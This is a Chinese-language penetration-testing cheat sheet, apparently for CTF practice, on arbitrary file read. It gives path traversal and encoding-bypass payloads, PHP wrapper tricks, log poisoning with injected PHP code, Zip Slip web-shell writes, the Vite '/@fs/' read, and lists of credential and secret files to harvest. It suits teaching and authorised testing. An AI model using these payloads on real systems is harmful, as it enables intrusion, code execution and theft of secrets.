任意文件读取的关键不是 `../` 本身，而是**读哪一个文件能产生下一跳**：源码里的数据库口令、`/proc/self/environ` 的环境变量、日志里的可控内容、SSH 私钥、云元数据。先列目标文件，再谈绕过。

> 只读取本地题目或授权目标上的文件；不要读取与本题目无关的用户数据。

## 00 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 验证穿越 | `../../../../etc/passwd` | 数深度 |
| 绕编码 | `..%2f`、`%2e%2e%2f`、双编码 | 看解码次数 |
| 绕过滤 | `....//`、`..;/`、`..%5c` | 容器/Windows |
| 读源码 | `php://filter/convert.base64-encode` | 避免执行 |
| 进程信息 | `/proc/self/cmdline`/`environ` | 密钥/参数 |
| 日志投毒 | UA/Referer 写码 | 包含日志 |
| 压缩包 | Zip Slip 条目 | 解压穿越 |
| 前端服务 | `/@fs/` + `?raw??` | Vite 老版本 |
| 下一跳 | 源码/密钥/云凭证 | 横向 |

## 01 原理与成立条件

```text
用户路径 → 拼接基础目录 → 规范化/校验 → 打开文件
                                      ├─ 校验前解码 → 编码绕过
                                      ├─ 校验后拼接 → 穿越
                                      └─ 符号链接 → 检查后逃逸
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 路径参数可控 | 文件名/下载/预览 | 找包含/模板 |
| 拼接未规范化 | `..` 可达 | 编码/双写 |
| 读取进程有权限 | Web 用户可读 | 换文件/提权 |
| 内容可回显 | 响应/日志/报错 | 盲读/包含 |

## 02 判断与分型

```text
参数像路径吗？
 ├─ 是 → 试穿越/编码/绝对路径
 └─ 否 → 试包含/下载/模板
有回显吗？
 ├─ 有 → 直接读
 └─ 无 → 报错/日志/包含/盲读
读到什么？
 ├─ 源码 → 密钥/内网/下一跳
 ├─ 进程 → 环境变量/参数
 ├─ 日志 → 投毒包含
 └─ 压缩包 → Zip Slip
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| 返回 `root:x:0:0` | 读取成功 | 换敏感文件 |
| 统一 404 | 过滤/规范化 | 换编码/深度 |
| 报错带绝对路径 | 信息泄露 | 记基础目录 |
| 下载 `Content-Disposition` | 文件接口 | 读源码/配置 |
| 页面含 `@vite/client` | Vite | 试 `/@fs/` |
| 日志可读 | 投毒 | 写码+包含 |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 报错含路径 | 只是信息 | 看正文 |
| 读到 `/etc/passwd` 但无 flag | 正常 | 找下一跳 |
| 包含无输出 | 脚本无回显 | base64 读源码 |
| 403 就放弃 | 可能被包含 | 试 LFI |

## 03 利用阶梯

### L0 验证读取与深度

**前提**：有下载/预览/读取参数。

**步骤**：
1. 试 `../../../../etc/passwd`，逐步加深度。
2. 试绝对路径 `/etc/passwd`。
3. 试 `..%2f`、`%2e%2e%2f`、双重编码。
4. 记录过滤发生在解码前还是后。

**成功标志**：稳定读到已知文件内容。

**失败分支**：统一 404→换编码/换参数；无回显→报错/盲读。

### L1 敏感文件与源码

**前提**：可读任意文件或限定目录。

**步骤**：
1. Linux：`/etc/passwd`、`/etc/hosts`、`/proc/self/environ`、`/proc/self/cmdline`。
2. 源码：`/var/www/html/index.php`、`.env`、`config.php`。
3. Windows：`win.ini`、`web.config`、`applicationHost.config`。
4. Java：`WEB-INF/web.xml`、`classes/*.class`、`lib/*.jar`。

**成功标志**：拿到源码/配置/密钥。

**失败分支**：路径未知→报错/目录扫描；权限不足→换文件。

### L2 包含与伪协议

**前提**：参数进入 `include`/`require` 或文件函数。

**步骤**：
1. `php://filter/convert.base64-encode/resource=index.php`。
2. `php://input`/`data://` 需 `allow_url_include=On`。
3. `phar://` 触发反序列化；`zip://` 读包内文件。
4. 过滤 `php://` 时试大小写/双重编码/`read=`。

**成功标志**：读到源码/执行代码/触发反序列化。

**失败分支**：协议被禁→本地文件/日志；路径拼接→截断/编码。

### L3 日志投毒与 Zip Slip

**前提**：能写日志/上传压缩包并解压。

**步骤**：
1. 确认日志路径与可读性。
2. 在 UA/Referer 写 `<?php ...?>`（URL 会编码）。
3. 包含日志执行。
4. Zip Slip：构造 `../../var/www/html/shell.php` 条目，上传后解压。
5. tar：绝对路径/符号链接。

**成功标志**：包含日志执行/解压写出可执行文件。

**失败分支**：日志不可读→换字段/换文件；解压校验→换编码/链接。

### L4 前端服务与下一跳

**前提**：目标是 Vite/开发服务器，或需要从读取升级。

**步骤**：
1. 看页面是否含 `@vite/client`、`/@fs/`。
2. 试 `/@fs/etc/passwd?raw??`、`?import&raw??`（按公告核对版本）。
3. 读 `vite.config.*`、`.env`、`package.json`。
4. 从源码/环境变量找数据库、内网、云凭证。

**成功标志**：读到配置/凭证，进入下一阶段。

**失败分支**：版本已修→换入口；无凭证→读源码找逻辑漏洞。

## 04 绕过与边界

| 限制 | 替代 | 示例 |
|---|---|---|
| `../` 被删 | `....//`/双写 | 过滤一次后剩 `../` |
| URL 解码 | 双重编码 | `..%252f` |
| 反斜杠 | Windows | `..%5c` |
| 路径归一化 | `..;/` | 容器/代理差异 |
| `php://` 被拦 | 大小写/编码 | `PHP://`、`php%3a//` |
| `base64` 被拦 | `convert.iconv.*` | 字符集转换 |
| 绝对路径 | `file://` | 本地文件 |

边界：`%00` 截断仅 PHP <5.3.4；`/proc/self` 每个进程不同；日志可能被转义；Vite 只在开发模式且版本受影响。

## 05 非典型入口

| 位置 | 示例 | 注意 |
|---|---|---|

| 模板预览 | `template=../../` | 包含 |
| 日志查看 | `log=../../` | 读取 |
| 图片代理 | `url=file://` | SSRF/读取 |
| 压缩包 | Zip Slip | 解压 |
| 编辑器 | 文件管理 | 直读/写 |
| 备份文件 | `.zip`/`.bak` | 源码泄露 |
| 前端 | Vite `/@fs/` | 开发服务 |
